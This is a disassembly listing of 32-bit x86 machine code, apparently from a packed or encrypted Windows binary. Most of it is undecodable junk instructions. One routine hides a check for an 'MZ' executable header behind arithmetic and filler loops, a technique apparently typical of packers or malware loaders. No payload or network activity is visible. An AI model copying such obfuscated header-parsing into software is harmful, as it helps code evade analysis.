  40fead:	fmul   DWORD PTR [ebp+0x300032a9]
  40feb3:	and    esi,DWORD PTR [eax]
  40feb5:	add    eax,0xa1bf8f12
  40feba:	jge    0x40fe53
  40febc:	xchg   ecx,eax
  40febd:	cli    
  40febe:	call   0x1443c43
  40fec3:	popf   
  40fec4:	and    DWORD PTR [ecx],0x54
  40fec7:	push   ds
  40fec8:	(bad)  
  40feca:	popa   
  40fecb:	aam    0x7d
  40fecd:	iret   
  40fece:	lods   eax,DWORD PTR ds:[esi]
  40fecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fed0:	pop    esp
  40fed1:	aam    0x3f
  40fed3:	(bad)  
  40fed4:	clc    
  40fed5:	mov    dl,0xd2
  40fed7:	xchg   ebx,eax
  40fed8:	pop    esi
  40fed9:	sub    al,0x35
  40fedb:	call   ebp
  40fedd:	adc    edi,DWORD PTR [ebp-0x7b]
  40fee0:	cld    
  40fee1:	dec    edi
  40fee2:	adc    dl,0x9c
  40fee5:	fild   WORD PTR [edi+esi*2+0x7831a29c]
  40feec:	mov    BYTE PTR [edx],dh
  40feee:	jp     0x40fe96
  40fef0:	cmc    
  40fef1:	neg    DWORD PTR [ecx+0x61]
  40fef4:	push   edi
  40fef5:	jl     0x40fe9e
  40fef7:	lock imul ebp,esp,0xf47d8caa
  40fefe:	adc    al,0x68
  40ff00:	fcmovbe st,st(7)
  40ff02:	or     BYTE PTR [edi],dl
  40ff04:	es or  eax,0x53fe0f2c
  40ff0a:	adc    eax,0x56d6ed30
  40ff0f:	inc    edi
  40ff10:	cmp    BYTE PTR [edx-0x18],dl
  40ff13:	jle    0x40fed7
  40ff15:	or     al,0x57
  40ff17:	inc    edx
  40ff18:	hlt    
  40ff19:	jp     0x40ff3c
  40ff1b:	ds push es
  40ff1d:	or     DWORD PTR [ebx],eax
  40ff1f:	fldenv [esi]
  40ff21:	push   ebp
  40ff22:	cmp    eax,0x2d73d8ab
  40ff27:	xor    DWORD PTR [edi+0x10f9c260],eax
  40ff2d:	mov    dl,0x3a
  40ff2f:	cmp    BYTE PTR [edi+0x1],ch
  40ff32:	fmul   DWORD PTR [ebx+0x192d9b2e]
  40ff38:	pushf  
  40ff39:	cmova  ecx,DWORD PTR [eax]
  40ff3c:	sub    DWORD PTR [ebp-0x4],ebp
  40ff3f:	stos   BYTE PTR es:[edi],al
  40ff40:	rcl    BYTE PTR [edx],1
  40ff42:	xor    dh,0xab
  40ff45:	mov    esp,0xa01bd7b1
  40ff4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff4b:	push   es
  40ff4c:	jbe    0x40ff1b
  40ff4e:	xchg   esi,eax
  40ff4f:	ins    BYTE PTR es:[edi],dx
  40ff50:	jo     0x40ff62
  40ff52:	mov    WORD PTR [ebx-0xf4ef34e],ss
  40ff58:	pminub mm5,mm7
  40ff5b:	jg     0x40ff35
  40ff5d:	and    eax,0x91190afa
  40ff62:	aam    0xde
  40ff64:	out    0x49,al
  40ff66:	mov    esi,DWORD PTR [ecx+0x69]
  40ff69:	fsub   QWORD PTR [eax]
  40ff6b:	mov    BYTE PTR [eax+ebp*1+0x19],dl
  40ff6f:	mov    ah,0x65
  40ff71:	or     al,0x6d
  40ff73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff74:	jb     0x40ff0a
  40ff76:	popf   
  40ff77:	pop    es
  40ff78:	loope  0x40ffa5
  40ff7a:	clc    
  40ff7b:	test   al,0xa2
  40ff7d:	xor    eax,0xbc555a25
  40ff82:	mov    ds:0x8cf252e7,eax
  40ff87:	or     eax,0xc799ab0
  40ff8c:	rol    DWORD PTR [edx+0x7111f8db],1
  40ff92:	cmc    
  40ff93:	lock xchg esi,eax
  40ff95:	call   0xe9605ebf
  40ff9a:	lods   al,BYTE PTR ds:[esi]
  40ff9b:	mov    ah,0x13
  40ff9d:	add    eax,0x70f1e0f9
  40ffa2:	lock and BYTE PTR [eax+0x28],al
  40ffa6:	mov    ecx,0x1abd0dcc
  40ffab:	dec    ebx
  40ffac:	test   al,0x23
  40ffae:	cmp    bl,BYTE PTR [esp+edi*2-0x510531b5]
  40ffb5:	fsubr  QWORD PTR [esi+0x25ccdfd4]
  40ffbb:	sub    esi,0xffffff83
  40ffbe:	sar    BYTE PTR [edx],cl
  40ffc0:	pop    ds
  40ffc1:	test   BYTE PTR [ecx-0x7d],cl
  40ffc4:	test   ebp,esi
  40ffc6:	ins    DWORD PTR es:[edi],dx
  40ffc7:	adc    BYTE PTR [edi],bh
  40ffc9:	push   ebx
  40ffca:	out    0xdd,al
  40ffcc:	add    dh,BYTE PTR [ebx]
  40ffce:	stos   DWORD PTR es:[edi],eax
  40ffcf:	push   es
  40ffd0:	adc    DWORD PTR [ecx+eax*8],0xce44606
  40ffd7:	xchg   edx,eax
  40ffd8:	shl    DWORD PTR [edx-0x4f],0x14
  40ffdc:	mov    dl,0x8f
  40ffde:	mov    eax,ds:0x614e8320
  40ffe3:	jge    0x40ff70
  40ffe5:	adc    BYTE PTR [ebx],dh
  40ffe7:	push   0xffffffe1
  40ffe9:	adc    BYTE PTR [eax],0xe8
  40ffec:	imul   esp,edx,0xffffff92
  40ffef:	inc    esp
  40fff0:	xchg   ecx,eax
  40fff1:	mul    DWORD PTR [edx+0x7c]
  40fff4:	in     eax,dx
  40fff5:	bt     esp,ebx
  40fff8:	xchg   ebp,eax
  40fff9:	mov    al,ds:0xf403180f
  40fffe:	loop   0x410004
  410000:	loopne 0x410080
  410002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410003:	(bad)  
  410004:	mov    al,0x47
  410006:	mov    esp,0xbc096234
  41000b:	push   edx
  41000c:	je     0x410064
  41000e:	imul   ebx,DWORD PTR [edx],0xe05d453d
  410014:	clc    
  410015:	push   ebx
  410016:	xchg   BYTE PTR [esi],ch
  410018:	pop    ds
  410019:	inc    esi
  41001a:	sahf   
  41001b:	fs mov edx,0xf4fb175c
  410021:	pushf  
  410022:	pushf  
  410023:	mov    bl,0xd1
  410025:	xor    al,0xee
  410027:	call   0x293f5b0a
  41002c:	stos   DWORD PTR es:[edi],eax
  41002d:	adc    ch,ch
  41002f:	adc    eax,0xce704212
  410034:	(bad)  
  410035:	in     al,0xa
  410037:	xchg   esi,eax
  410038:	add    ebp,DWORD PTR [ebp+eiz*4+0x4d]
  41003c:	lock mov bh,0x16
  41003f:	pushf  
  410040:	mov    DWORD PTR [edx-0x27c965ce],0x9ac68024
  41004a:	retf   
  41004b:	mov    BYTE PTR [eax-0x68],dl
  41004e:	xor    bh,bh
  410050:	lock mov ah,0xd6
  410053:	push   0x5c
  410055:	sub    BYTE PTR [eax],dh
  410057:	cmp    eax,0x3a824f44
  41005c:	inc    ebx
  41005d:	cmc    
  41005e:	popa   
  41005f:	xchg   ecx,eax
  410060:	or     eax,0xeed397f2
  410065:	sbb    bl,cl
  410067:	je     0x4100b4
  410069:	jmp    0x6e61:0x27309df7
  410070:	mov    BYTE PTR [esi+0x37],al
  410073:	std    
  410074:	mov    esi,DWORD PTR [edi-0x2e400866]
  41007a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41007b:	mov    ebx,0x878dc50b
  410080:	lods   eax,DWORD PTR ds:[esi]
  410081:	fidiv  WORD PTR [bp+si+0x30f1]
  410086:	xor    DWORD PTR [ebp-0x51e55638],ecx
  41008c:	jo     0x4100ec
  41008e:	mov    ebx,0x47fd5642
  410093:	xlat   BYTE PTR ds:[ebx]
  410094:	sbb    eax,0x4c3d56f6
  410099:	mov    DWORD PTR ds:0x2a2f1692,edx
  41009f:	lea    esp,ds:0x44be3b6a
  4100a5:	outs   dx,BYTE PTR ds:[esi]
  4100a6:	outs   dx,DWORD PTR ds:[esi]
  4100a7:	pop    ss
  4100a8:	shr    BYTE PTR [esi-0x74],cl
  4100ab:	fnsave [edi+eax*2-0x1f3e650f]
  4100b2:	cli    
  4100b3:	mov    ah,0xa6
  4100b5:	sub    al,bl
  4100b7:	cmp    bh,ch
  4100b9:	mov    bh,0x33
  4100bb:	sti    
  4100bc:	dec    ebp
  4100bd:	int3   
  4100be:	cmp    DWORD PTR [edx+0x47dbeb5a],esi
  4100c4:	xchg   ebp,eax
  4100c5:	les    esp,FWORD PTR [esi]
  4100c7:	mov    al,ds:0xbf30098e
  4100cc:	fwait
  4100cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100cf:	aaa    
  4100d0:	adc    edx,esp
  4100d2:	mov    al,0x9
  4100d4:	jnp    0x410115
  4100d6:	fdiv   QWORD PTR [edi]
  4100d8:	mov    edi,0xfd3ce0d1
  4100dd:	xchg   edi,eax
  4100de:	ins    BYTE PTR es:[edi],dx
  4100df:	add    edx,DWORD PTR ds:0x65ed7367
  4100e5:	mov    WORD PTR [ecx-0x699b4e41],ss
  4100eb:	mov    ds:0xbf2c497a,al
  4100f0:	test   al,0x81
  4100f2:	mov    bh,0xc2
  4100f4:	sbb    eax,0xd41e4fd1
  4100f9:	jp     0x41010c
  4100fb:	test   eax,0xaa0c79de
  410100:	add    ecx,DWORD PTR [ecx-0x53293cfb]
  410106:	ror    DWORD PTR [edx+0x2bb50c05],0x5f
  41010d:	pop    ecx
  41010e:	fimul  WORD PTR [eax+0xa20c8ac]
  410114:	mov    dl,dh
  410116:	jno    0x410103
  410118:	(bad)  
  410119:	pop    eax
  41011a:	push   ecx
  41011b:	or     eax,0x458b292b
  410120:	cld    
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [esi+0x788beb45],esi
  41013a:	inc    esp
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x4100cf
  410142:	(bad)  
  410143:	aad    0xc3
  410145:	pop    ecx
  410146:	bnd jne 0x4101b7
  410149:	dec    esi
  41014a:	push   0x3
  41014c:	call   0xe888:0xe7afa414
  410153:	stos   BYTE PTR es:[edi],al
  410154:	pop    ebx
  410155:	fmul   st,st(0)
  410157:	pop    edi
  410158:	dec    esi
  410159:	add    BYTE PTR ds:0x5c0c81be,dh
  41015f:	cmp    ah,BYTE PTR [edi-0x7a3f6a7a]
  410165:	ror    ch,0x86
  410168:	popf   
  410169:	(bad)  
  41016a:	sti    
  41016b:	stos   DWORD PTR es:[edi],eax
  41016c:	jno    0x4101e7
  41016e:	fsub   DWORD PTR [ebp+0x9]
  410171:	pusha  
  410172:	sbb    al,0x3
  410174:	in     eax,dx
  410175:	xchg   ebp,eax
  410176:	imul   esp,DWORD PTR ds:0x1f49a58e,0x344aaf25
  410180:	lea    ebp,[ecx+0x2b2cd7b2]
  410186:	xchg   esp,eax
  410187:	mov    esp,0x7ede9e81
  41018c:	mov    ss,WORD PTR [ebx+0x6a]
  41018f:	sub    DWORD PTR [ebp+0x2031290d],esi
  410195:	iret   
  410196:	mov    ah,0xf3
  410198:	out    dx,eax
  410199:	cmp    BYTE PTR [edi+0x15],0x8a
  41019d:	cmp    ch,BYTE PTR [esp+eax*2+0x5c]
  4101a1:	in     al,0x99
  4101a3:	cmp    eax,0x2fa2c1ab
  4101a8:	add    DWORD PTR [esi-0x37],0x26
  4101ac:	pop    esi
  4101ad:	xlat   BYTE PTR ds:[ebx]
  4101ae:	mov    ah,0x99
  4101b0:	loopne 0x410159
  4101b2:	and    cl,cl
  4101b4:	cmc    
  4101b5:	dec    esp
  4101b6:	sbb    ebp,DWORD PTR [ebx+eax*2+0x33]
  4101ba:	jb     0x4101aa
  4101bc:	fisttp WORD PTR [ecx+0x39c71497]
  4101c2:	mov    dh,0x39
  4101c4:	aam    0x73
  4101c6:	jmp    0x41018e
  4101c8:	xor    esp,ecx
  4101ca:	imul   ebp,DWORD PTR [ebp-0x6fcd080f],0x7bb42b0b
  4101d4:	mov    ebx,0x91484cde
  4101d9:	ss mov dh,bl
  4101dc:	fcomp  DWORD PTR [ebx+0x27]
  4101df:	test   eax,0x6d8dca9c
  4101e4:	jo     0x410237
  4101e6:	jbe    0x41019d
  4101e8:	sbb    al,0x88
  4101ea:	dec    ecx
  4101eb:	hlt    
  4101ec:	dec    eax
  4101ed:	pushf  
  4101ee:	push   ecx
  4101ef:	or     dl,BYTE PTR [edi]
  4101f1:	xchg   ecx,eax
  4101f2:	popa   
  4101f3:	enter  0x9fce,0xa5
  4101f7:	pop    edx
  4101f8:	icebp  
  4101f9:	pop    eax
  4101fa:	pop    esp
  4101fb:	clc    
  4101fc:	aad    0xb5
  4101fe:	fstp   DWORD PTR [ebp+0x40]
  410201:	(bad)  
  410202:	jb     0x4101d1
  410204:	or     eax,0x3c47b87b
  410209:	test   DWORD PTR [edx],ebx
  41020b:	push   esp
  41020c:	pop    ebp
  41020d:	(bad)  
  41020f:	shr    BYTE PTR [ebx],0xcf
  410212:	sub    esi,edi
  410214:	mov    esi,0xd6d2bc85
  410219:	cld    
  41021a:	lods   al,BYTE PTR ds:[esi]
  41021b:	pop    esi
  41021c:	or     eax,0x94fab40f
  410221:	sub    DWORD PTR [ebx+0x48],esp
  410224:	push   ds
  410225:	rcr    DWORD PTR [ebp-0x6d],1
  410228:	or     al,0xba
  41022a:	add    eax,0x21be3c12
  41022f:	mov    cl,0x9e
  410231:	repnz push ds
  410233:	das    
  410234:	add    esi,edx
  410236:	aaa    
  410237:	adc    ch,BYTE PTR ds:0xa7cc79cb
  41023d:	sbb    eax,0x166f96dc
  410242:	(bad)  
  410243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410244:	loope  0x410255
  410246:	pop    ecx
  410247:	sbb    al,0xe9
  410249:	jae    0x4102bb
  41024b:	clc    
  41024c:	cmp    bh,ch
  41024e:	lock inc edx
  410250:	mov    edx,0x486463e2
  410255:	outs   dx,DWORD PTR ds:[esi]
  410256:	pop    esp
  410257:	add    al,0xb3
  410259:	or     bh,BYTE PTR [ebp-0x1f83cdf2]
  41025f:	jb     0x41021e
  410261:	push   ds
  410262:	je     0x410272
  410264:	retf   
  410265:	push   es
  410266:	jmp    0x41020c
  410268:	retf   
  410269:	push   edx
  41026b:	mov    esp,0x3d8cae09
  410270:	push   ebx
  410271:	call   0x18edd8e4
  410276:	(bad)  
  410277:	enter  0x8c8c,0xf9
  41027b:	mov    al,ds:0x90c8d767
  410280:	xor    BYTE PTR [edx-0x536cca6f],cl
  410286:	imul   esp,DWORD PTR [ecx-0x23],0x6f
  41028a:	fsub   QWORD PTR [esi-0x5ab28732]
  410290:	test   BYTE PTR [esi-0x6d],0xd4
  410294:	jl     0x4102fd
  410296:	arpl   WORD PTR [ecx],di
  410298:	pop    ebp
  410299:	pop    eax
  41029a:	aas    
  41029b:	in     al,dx
  41029c:	or     eax,0x9dd14c9c
  4102a1:	mov    ecx,eax
  4102a3:	repnz test BYTE PTR [ebx-0x7495ab1c],cl
  4102aa:	je     0x4102cb
  4102ac:	cmp    ch,BYTE PTR [edx-0x3a]
  4102af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102b0:	pushf  
  4102b1:	xchg   BYTE PTR [ebp-0x43],ch
  4102b4:	test   eax,eax
  4102b6:	add    bl,bh
  4102b8:	jb     0x4102f5
  4102ba:	int    0x11
  4102bc:	inc    ecx
  4102bd:	pushf  
  4102be:	xor    al,0xfe
  4102c0:	sbb    esp,DWORD PTR [esi]
  4102c2:	and    BYTE PTR [ecx+0x170b7497],ch
  4102c8:	mov    bh,0x2c
  4102ca:	mov    ebx,0xda8be42
  4102cf:	in     eax,dx
  4102d0:	out    0x57,eax
  4102d2:	aad    0xfc
  4102d4:	and    esp,DWORD PTR ds:0x4d3be17
  4102da:	pop    ss
  4102db:	popf   
  4102dc:	jo     0x410281
  4102de:	push   ss
  4102df:	pushf  
  4102e0:	xchg   edx,eax
  4102e1:	mov    eax,0xf4a80b2a
  4102e6:	or     al,BYTE PTR [eax+0x4b2227ab]
  4102ec:	adc    eax,0x11fe42cb
  4102f1:	jnp    0x410368
  4102f3:	sbb    BYTE PTR [eax+0x2d],ah
  4102f6:	mov    ebp,0xa44596ea
  4102fb:	xor    BYTE PTR [ebx],cl
  4102fd:	pop    ds
  4102fe:	inc    esi
  4102ff:	jg     0x410332
  410301:	jmp    DWORD PTR [edi+ebx*1-0x50]
  410305:	mov    ah,0x56
  410307:	scas   al,BYTE PTR es:[edi]
  410308:	outs   dx,DWORD PTR ds:[esi]
  410309:	out    dx,eax
  41030a:	rcl    DWORD PTR [ebp+0x5e],cl
  41030d:	jne    0x41034c
  41030f:	mov    dl,0xc3
  410311:	and    al,0xbb
  410313:	xchg   DWORD PTR [esi+eax*4-0x6],esp
  410317:	mov    al,ds:0x6f70d0ee
  41031c:	je     0x410399
  41031e:	pop    edi
  41031f:	and    BYTE PTR [eax],al
  410321:	das    
  410322:	sbb    DWORD PTR [esi+0x1a],edx
  410325:	in     al,0x56
  410327:	add    al,ch
  410329:	dec    esp
  41032a:	sbb    ch,BYTE PTR [ebx]
  41032c:	or     eax,0x982f37c5
  410331:	dec    edi
  410332:	fcmovnu st,st(6)
  410334:	iret   
  410335:	push   ebx
  410336:	push   ebx
  410337:	mov    bh,ch
  410339:	mov    eax,0xcc7c12ed
  41033e:	sbb    al,0x3
  410340:	out    dx,al
  410341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410342:	outs   dx,DWORD PTR gs:[esi]
  410344:	sub    BYTE PTR [edi-0x7f],0xdc
  410348:	dec    ecx
  410349:	xchg   edx,eax
  41034a:	and    eax,0x889177bf
  41034f:	ins    DWORD PTR es:[edi],dx
  410350:	scas   eax,DWORD PTR es:[edi]
  410351:	arpl   cx,si
  410353:	add    BYTE PTR [eax],0x5b
  410356:	and    al,0x45
  410358:	sub    eax,DWORD PTR [esi-0x45e37459]
  41035e:	mov    edi,0x18b6e94e
  410363:	fnstcw WORD PTR [ebp+0x37]
  410366:	loop   0x410380
  410368:	stos   BYTE PTR es:[edi],al
  410369:	pop    eax
  41036a:	xlat   BYTE PTR ds:[ebx]
  41036b:	inc    ebp
  41036c:	popa   
  41036d:	je     0x410376
  41036f:	(bad)
  410373:	cmp    eax,0x52b4b2df
  410378:	or     al,0x44
  41037a:	or     eax,0x6e7b65fa
  41037f:	lods   eax,DWORD PTR ds:[esi]
  410380:	(bad)  
  410381:	int    0x16
  410383:	ss scas al,BYTE PTR es:[edi]
  410385:	cmp    ch,BYTE PTR [esi-0x77246ad3]
  41038b:	jno    0x4103ff
  41038d:	jmp    0x400:0x276ddc06
  410394:	sub    BYTE PTR ds:0xd2c0dce9,bh
  41039a:	push   es
  41039b:	push   cs
  41039c:	std    
  41039d:	adc    al,0x24
  41039f:	mov    edx,0xbb31ba21
  4103a4:	in     al,dx
  4103a5:	cmp    DWORD PTR [edx-0x5301bdfe],ebx
  4103ab:	shl    DWORD PTR [edx+0x731f6976],1
  4103b1:	(bad)  
  4103b2:	pop    edi
  4103b3:	js     0x410364
  4103b5:	clc    
  4103b6:	adc    ecx,DWORD PTR [eax]
  4103b8:	je     0x41034d
  4103ba:	ins    BYTE PTR es:[edi],dx
  4103bb:	pop    edi
  4103bc:	loop   0x410435
  4103be:	ins    DWORD PTR es:[edi],dx
  4103bf:	sbb    bl,0x41
  4103c2:	mov    esi,0x1d765ff4
  4103c7:	cmp    BYTE PTR [ebp+0x6f3696d2],dl
  4103cd:	les    esi,FWORD PTR [ebx]
  4103cf:	push   edi
  4103d0:	inc    edx
  4103d1:	mov    ch,0xc1
  4103d3:	rcl    BYTE PTR [edx],1
  4103d5:	xlat   BYTE PTR ds:[ebx]
  4103d7:	push   edi
  4103d8:	test   BYTE PTR [ecx-0x23],bl
  4103db:	dec    ecx
  4103dc:	inc    ebp
  4103dd:	adc    ah,ah
  4103df:	and    BYTE PTR [ecx+eiz*4],bl
  4103e2:	sub    esp,DWORD PTR [edx-0x4e]
  4103e5:	push   esp
  4103e6:	fcmovu st,st(2)
  4103e8:	sbb    al,0x15
  4103ea:	in     al,0xfe
  4103ec:	xor    bh,BYTE PTR [ecx-0x55]
  4103ef:	(bad)  
  4103f0:	xor    al,0xfc
  4103f2:	jge    0x4103cb
  4103f4:	fdiv   st,st(7)
  4103f6:	inc    ecx
  4103f7:	pushf  
  4103f8:	sub    DWORD PTR [eax-0x293dab8f],esp
  4103fe:	fnstsw WORD PTR [edi+edx*8-0x7929277a]
  410405:	adc    eax,DWORD PTR [esi*4+0x18613174]
  41040c:	pushf  
  41040d:	push   es
  41040e:	cdq    
  41040f:	leave  
  410410:	jecxz  0x41039c
  410412:	out    dx,eax
  410413:	mov    ds:0xdfa039c6,al
  410418:	jb     0x410440
  41041a:	sbb    esp,DWORD PTR [edi+0x74]
  41041d:	xchg   esp,eax
  41041e:	cmp    DWORD PTR [eax+0x51],0x974ef119
  410425:	adc    dl,dl
  410427:	shl    DWORD PTR [edi],cl
  410429:	ret    0x44ca
  41042c:	jns    0x4103ef
  41042e:	sbb    DWORD PTR [edx],0x1a19c2a1
  410434:	bound  esp,QWORD PTR [ecx+0x5f371108]
  41043a:	jecxz  0x41041e
  41043c:	add    DWORD PTR [edx+0x56],edx
  41043f:	xchg   edx,eax
  410440:	cmp    bl,BYTE PTR [ebp+0x7cb5a89b]
  410446:	stos   DWORD PTR es:[edi],eax
  410447:	jns    0x41046a
  410449:	enter  0x367a,0x8a
  41044d:	sbb    edi,esi
  41044f:	nop
  410450:	fwait
  410451:	inc    ebx
  410452:	jp     0x4103fc
  410454:	push   ecx
  410455:	popf   
  410456:	adc    edx,DWORD PTR [esi+ecx*8-0x6]
  41045a:	jmp    0xd299a4a8
  41045f:	mov    ebx,0x97edb2ed
  410464:	aam    0x8f
  410466:	lea    ebp,[eax-0x8]
  410469:	dec    ebp
  41046a:	cmp    DWORD PTR [ecx],0xffffffa6
  41046d:	add    al,0x4
  41046f:	sub    BYTE PTR [ebp+0x2629d916],al
  410475:	nop
  410476:	pop    eax
  410477:	call   FWORD PTR [eax+0x12]
  41047a:	cdq    
  41047b:	push   0x3c8129ca
  410480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410481:	in     al,dx
  410482:	mov    WORD PTR [esi-0x77],fs
  410485:	jb     0x410506
  410487:	xor    cl,BYTE PTR [esi]
  410489:	dec    esi
  41048a:	xchg   ebx,eax
  41048b:	adc    al,BYTE PTR [ecx]
  41048d:	or     bl,BYTE PTR [edx+esi*2+0x5e]
  410491:	pop    ss
  410492:	mov    ecx,0xc06831b4
  410497:	xrelease xchg DWORD PTR [ebx+ebx*1],edx
  41049b:	mov    edx,0x3b8646bf
  4104a0:	dec    esi
  4104a1:	sbb    ecx,edx
  4104a3:	je     0x4104a7
  4104a5:	mov    dh,0x6c
  4104a7:	leave  
  4104a8:	jno    0x4104ab
  4104aa:	or     BYTE PTR [edi-0x646f4fb3],0xc9
  4104b1:	xchg   edx,eax
  4104b2:	mov    ebp,DWORD PTR [ebp-0x18]
  4104b5:	pop    eax
  4104b6:	xchg   ecx,eax
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x434677,0x1f
  4104d3:	cmp    DWORD PTR ds:0x434677,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x434677,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x434677,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x434677
  410508:	dec    eax
  410509:	mov    ds:0x434677,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x434677
  410516:	dec    eax
  410517:	mov    ds:0x434677,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x4346c7,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43470f,0x434793
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x4346cf,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434707
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x43466b,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x43466b
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x43466b,edx
  410571:	cmp    DWORD PTR ds:0x43466b,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x43466b,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x43466b,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x43466b
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x43466b,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	into   
  4105ed:	pusha  
  4105ee:	and    DWORD PTR [ebp+0x7e7e47f6],ebp
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x410602
  4105f9:	call   0x6247abeb
  4105fe:	jb     0x410659
  410600:	scas   al,BYTE PTR es:[edi]
  410601:	cmp    BYTE PTR [eax+0xa],bh
  410604:	out    dx,eax
  410605:	shl    BYTE PTR [edi-0x79],0x11
  410609:	aam    0xd2
  41060b:	xchg   ebx,eax
  41060c:	outs   dx,BYTE PTR ds:[esi]
  41060d:	jl     0x41061a
  41060f:	pushf  
  410610:	test   DWORD PTR [eax+eax*8],0x454956f2
  410617:	shl    DWORD PTR [ecx],cl
  410619:	inc    edi
  41061a:	lods   al,BYTE PTR ds:[esi]
  41061b:	or     ecx,DWORD PTR [edx-0x2f09d5f1]
  410621:	jge    0x410699
  410623:	inc    ecx
  410624:	fst    DWORD PTR [ebx+0x7cb3011d]
  41062a:	jmp    0x7d4462e4
  41062f:	jl     0x4105b1
  410631:	cmp    bl,dl
  410633:	lds    esi,FWORD PTR [edi+eax*4]
  410636:	push   edx
  410637:	fcomp  DWORD PTR [esi]
  410639:	out    0x8f,al
  41063b:	jl     0x410632
  41063d:	sub    BYTE PTR [ecx],bl
  41063f:	xchg   BYTE PTR [edx],dh
  410641:	xchg   DWORD PTR [ebx+0x7d],edx
  410644:	popa   
  410645:	mov    ds:0xfcd88e3e,al
  41064a:	xchg   esp,eax
  41064b:	iret   
  41064c:	test   DWORD PTR [ecx],0xa8e3bf30
  410652:	test   BYTE PTR [esi+0x22098cfc],al
  410658:	test   BYTE PTR [ecx+0x3ed3ad16],bl
  41065e:	imul   edi,DWORD PTR [esi],0xffffff8a
  410661:	cwde   
  410662:	das    
  410663:	and    BYTE PTR [edi-0x7f],cl
  410666:	les    edx,FWORD PTR [edx+0x374fb9f2]
  41066c:	pop    es
  41066d:	mov    cl,0x7e
  41066f:	ins    BYTE PTR es:[edi],dx
  410670:	mov    esi,0x6afa40d1
  410675:	aas    
  410676:	sti    
  410677:	sub    al,0xb8
  410679:	xor    al,0x32
  41067b:	icebp  
  41067c:	add    eax,DWORD PTR [ebp-0x49]
  41067f:	inc    edx
  410680:	dec    ecx
  410681:	shl    edx,0xf1
  410684:	inc    ebx
  410685:	ret    
  410686:	dec    edx
  410687:	dec    eax
  410688:	lods   al,BYTE PTR ds:[esi]
  410689:	pop    esi
  41068a:	mov    ah,0x66
  41068c:	xor    bl,BYTE PTR [esi]
  41068e:	js     0x410633
  410690:	cmp    eax,0xfd49a751
  410695:	inc    ebp
  410696:	and    DWORD PTR [edx-0x7cdb6d0e],ebx
  41069c:	inc    ebx
  41069d:	les    edx,FWORD PTR [edi]
  41069f:	sbb    ch,bh
  4106a1:	(bad)  
  4106a2:	jecxz  0x4106db
  4106a4:	in     al,0x87
  4106a6:	popf   
  4106a7:	adc    esp,0x2d
  4106aa:	add    al,0xee
  4106ac:	push   edx
  4106ad:	cmp    al,0x6c
  4106af:	(bad)  
  4106b0:	pop    esi
  4106b1:	fmul   QWORD PTR [edi]
  4106b3:	or     BYTE PTR [ebp-0x18a89d26],al
  4106b9:	fstp   TBYTE PTR [ecx+0x4b726125]
  4106bf:	sub    edi,esp
  4106c1:	test   DWORD PTR [ecx+0x49e6917f],ebp
  4106c7:	jb     0x4106fb
  4106c9:	in     eax,0x54
  4106cb:	scas   eax,DWORD PTR es:[edi]
  4106cc:	fldenv [ebp-0x73050d4b]
  4106d2:	add    bl,ah
  4106d4:	mov    WORD PTR [ebp+0x12],fs
  4106d7:	sub    al,0xf9
  4106d9:	fsub   DWORD PTR [esi]
